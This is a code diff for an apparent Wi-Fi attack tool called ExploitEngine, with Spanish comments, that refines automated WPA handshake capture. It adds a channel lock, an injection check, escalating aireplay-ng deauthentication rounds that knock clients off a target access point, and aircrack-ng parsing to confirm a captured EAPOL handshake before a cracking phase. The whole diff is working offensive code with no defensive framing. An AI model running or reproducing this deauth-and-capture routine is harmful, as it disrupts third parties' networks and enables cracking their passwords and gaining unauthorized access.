@@ -6494,7 +6494,8 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 shell=True,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
-            # Progreso durante captura (90s — más tiempo = más probabilidad de PMKID)
+            # Progreso durante captura (90s)
+            eng.set_status("hcxdumptool capturando PMKID — enviando association requests…")
             for tick in range(90):
                 eng.update_phase(5 + int(tick / 90 * 45))
                 time.sleep(1)
@@ -6549,39 +6550,68 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         hs_base = f"exploit-engine/hs_{essid_s}"
         run(f"rm -f {hs_base}*.cap {hs_base}*.csv 2>/dev/null")
 
+        # Asegurar canal correcto
+        run(f"iwconfig {iface} channel {channel} 2>/dev/null")
+
         # Lanzar airodump en background
         cap_proc = subprocess.Popen(
             f"airodump-ng -c {channel} --bssid {bssid} -w {hs_base} {iface} 2>/dev/null",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
-        eng.update_phase(10)
-        time.sleep(6)  # dar tiempo al airodump para sincronizar
+        eng.update_phase(5)
+        eng.set_status("Capturando tráfico (15s para sincronizar canal)…")
+        time.sleep(15)  # dar tiempo suficiente para sincronizar canal
 
-        # 5 rondas de deauth (3 paquetes cada ronda) con pausa entre rondas
-        for round_n in range(5):
-            eng.update_phase(10 + round_n * 15)
-            run(f"aireplay-ng -0 3 -a {bssid} {iface} 2>/dev/null",
-                capture=True)
-            time.sleep(2)  # pausa para que el cliente se reconecte
-            # Verificar si ya hay handshake
-            cap_list = [f for f in os.listdir("exploit-engine")
-                        if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
-            if cap_list:
-                _cap = f"exploit-engine/{cap_list[-1]}"
-                chk = run(f"aircrack-ng {_cap} 2>/dev/null | grep -i handshake",
-                          capture=True) or ""
-                if "handshake" in chk.lower():
-                    cap_file = _cap
+        def _hs_check():
+            """Retorna True si hay un handshake EAPOL real en los .cap capturados."""
+            caps = [f for f in os.listdir("exploit-engine")
+                    if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
+            for c in caps:
+                _p = f"exploit-engine/{c}"
+                out = run(f"aircrack-ng {_p} 2>/dev/null", capture=True) or ""
+                m = re.search(r'\((\d+)\s+handshake', out, re.IGNORECASE)
+                if m and int(m.group(1)) > 0:
+                    return _p
+            return None
+
+        # Verificar si hay inyección disponible
+        eng.set_status("Verificando capacidad de inyección…")
+        test_inj = run(f"aireplay-ng -0 1 -a {bssid} {iface} 2>&1", capture=True) or ""
+        can_inject = "no such bssid" not in test_inj.lower()
+
+        if can_inject:
+            # Rondas de deauth agresivas: 10 → 20 → 30 → 40 → 50 paquetes
+            deauth_rounds = [10, 20, 30, 40, 50]
+            for ri, npkts in enumerate(deauth_rounds):
+                pct = 15 + ri * 14
+                eng.update_phase(pct)
+                eng.set_status(f"Deauth ronda {ri+1}/{len(deauth_rounds)} — {npkts} paquetes…")
+                run(f"aireplay-ng -0 {npkts} -a {bssid} {iface} >/dev/null 2>&1")
+                time.sleep(5)  # pausa para reconexión del cliente
+                found = _hs_check()
+                if found:
+                    cap_file = found
+                    eng.set_status(f"Handshake EAPOL capturado: {cap_file}")
                     break
+        else:
+            # Sin inyección: esperar handshake natural 90s
+            eng.set_status("Sin inyección disponible — esperando handshake natural (90s)…")
+            for tick in range(90):
+                eng.update_phase(10 + int(tick / 90 * 70))
+                time.sleep(1)
+                if tick % 15 == 0:
+                    found = _hs_check()
+                    if found:
+                        cap_file = found
+                        eng.set_status(f"Handshake EAPOL capturado: {cap_file}")
+                        break
 
         cap_proc.terminate(); cap_proc.wait()
-        eng.update_phase(85)
+        eng.update_phase(90)
 
+        # Último chequeo si no se encontró durante deauths
         if not cap_file:
-            cap_list = [f for f in os.listdir("exploit-engine")
-                        if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
-            if cap_list:
-                cap_file = f"exploit-engine/{cap_list[-1]}"
+            cap_file = _hs_check()
     eng.update_phase(100)
 
     # ── FASE 5: Cracking multi-herramienta ────────────────────────────────────
